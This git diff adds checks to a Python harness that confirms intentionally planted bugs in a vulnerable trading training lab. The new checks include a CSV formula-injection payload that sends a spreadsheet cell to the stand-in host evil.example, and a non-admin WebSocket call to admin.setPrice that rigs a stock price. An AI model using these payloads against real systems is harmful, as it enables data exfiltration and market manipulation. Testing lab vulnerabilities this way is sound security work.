@@ -454,16 +454,68 @@ def crypto_section(lab):
     fires("IDOR (#47 style) ?userId= shows another user's coins", r.ok and r.json().get("userId") == a["userId"], r.text)
 
 
+# ---------------------------------------------------------------------------
+# 0.6.0 trading checks of vulntrade-exploits, re-run on the 1.0.0 routes
+# (the exploit repo still calls the retired /api/orders, /api/market, /topic/prices)
+# ---------------------------------------------------------------------------
+
+def legacy_section(lab):
+    print("0.6.0 trading checks on the new routes (exploit-suite ids)")
+    u = lab.user("leg")
+    for label, body, needle in (
+            ("BIZ-07 control: negative quantity rejected", {"quantity": "-5", "type": "LIMIT", "price": "100", "side": "BUY"}, "quantity"),
+            ("BIZ-09 control: naked short (selling shares you don't own) rejected",
+             {"quantity": "10", "type": "LIMIT", "price": "100", "side": "SELL"}, "position"),
+    ):
+        r = eq_order(lab, u, dict(body, symbol="AAPL"))
+        fires(label, needle in str(r.get("error", "")).lower(), r)
+    r = eq_order(lab, u, {"symbol": "NOPE", "side": "BUY", "type": "LIMIT", "quantity": "1", "price": "1"})
+    fires("BIZ-12 control: non-existent symbol rejected", "unknown symbol" in str(r.get("error", "")).lower(), r)
+
+    prices = []
+    for _ in range(3):
+        prices.append(float(eq_price(lab, "VULN")["currentPrice"]))
+        time.sleep(1)
+    fires("BIZ-16 / #38 VULN follows a predictable sine band (60-140)", all(60 < p < 140 for p in prices), prices)
+
+    ask = D(str(eq_price(lab, "AAPL")["ask"]))
+    r = eq_order(lab, u, {"symbol": "AAPL", "side": "BUY", "type": "MARKET", "quantity": "1"}, {"X-Channel": "ws"})
+    fires("BIZ-14 / #45 market order has no slippage cap (fills above the ask)",
+          r.get("status") == "FILLED" and D(str(r.get("avgFillPrice"))) > ask, {"fill": r.get("avgFillPrice"), "ask": str(ask)})
+
+    formula = '=HYPERLINK("http://evil.example/?x="&A1,"pwn")'
+    placed = eq_order(lab, u, {"symbol": "AAPL", "side": "BUY", "type": "LIMIT", "quantity": "1", "price": "1.00",
+                               "clientOrderId": formula})
+    export = lab.http.get(lab.base + "/api/export/trades", headers=u["auth"])
+    fires("INJ-08 / #91 CSV formula injection (order clientOrderId exported unescaped)",
+          placed.get("status") == "NEW" and export.status_code == 200 and ("," + formula) in export.text,
+          {"order": placed.get("status"), "export": export.status_code})
+
+    original = D(str(eq_price(lab, "GME")["currentPrice"]))
+    ws = Stomp(lab.base.replace("http", "ws", 1) + "/ws", u["token"])   # a TRADER, not an admin
+    ws.subscribe("/user/queue/admin")
+    ws.send("/app/admin.setPrice", {"symbol": "GME", "price": "13371.00"})
+    time.sleep(1.5)
+    rigged = D(str(eq_price(lab, "GME")["currentPrice"]))
+    ws.send("/app/admin.setPrice", {"symbol": "GME", "price": str(original)})
+    time.sleep(1)
+    ws.close()
+    fires("WS-02 / #35 #58 non-admin admin.setPrice moves a stock price (forwarded to equities)",
+          rigged == D("13371.00"), {"before": str(original), "after": str(rigged)})
+
+
 def main():
     ap = argparse.ArgumentParser()
     ap.add_argument("--base-url", required=True)
-    ap.add_argument("--only", default="fx,equities,crypto")
+    ap.add_argument("--only", default="fx,equities,crypto,legacy")
     args = ap.parse_args()
     lab = Lab(args.base_url)
     only = args.only.split(",")
-    sections = {"fx": fx_section, "equities": equities_section, "crypto": crypto_section}
+    sections = {"fx": fx_section, "equities": equities_section, "crypto": crypto_section, "legacy": legacy_section}
     for name in only:
-        if name in sections and lab.get("/api/%s/%s" % (name, "pairs" if name == "fx" else "market/prices")).ok:
+        probe = "/api/equities/market/prices" if name == "legacy" else \
+            "/api/%s/%s" % (name, "pairs" if name == "fx" else "market/prices")
+        if name in sections and lab.get(probe).ok:
             sections[name](lab)
     print("\n%d bugs fire, %d missing%s" % (len(FIRED), len(MISSED), (": %s" % MISSED) if MISSED else ""))
     return 0 if not MISSED else 1
